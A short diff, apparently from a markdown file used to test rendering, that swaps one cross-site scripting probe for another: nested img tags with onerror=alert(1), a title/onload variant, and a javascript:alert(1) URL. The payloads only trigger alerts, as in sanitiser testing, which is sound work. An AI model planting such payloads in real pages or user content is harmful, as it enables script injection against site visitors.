@@ -7,8 +7,7 @@
 ![text](https://avatars.githubusercontent.com/u/92805783?s=40&javascript:alert(1);)
 ![
 testeDev
-<img src="https://avatars.githubusercontent.com/u/92805783?&s=40&v=" title/onload="<img src='' onerror='alert(1)'>"/>
-
+<img src=<img src=<img src=<img src=<img src=<img src= onerror=alert(1)> onerror=alert(1)> onerror=alert(1)> onerror=alert(1)> onerror=alert(1)>>
 
 
 ](()
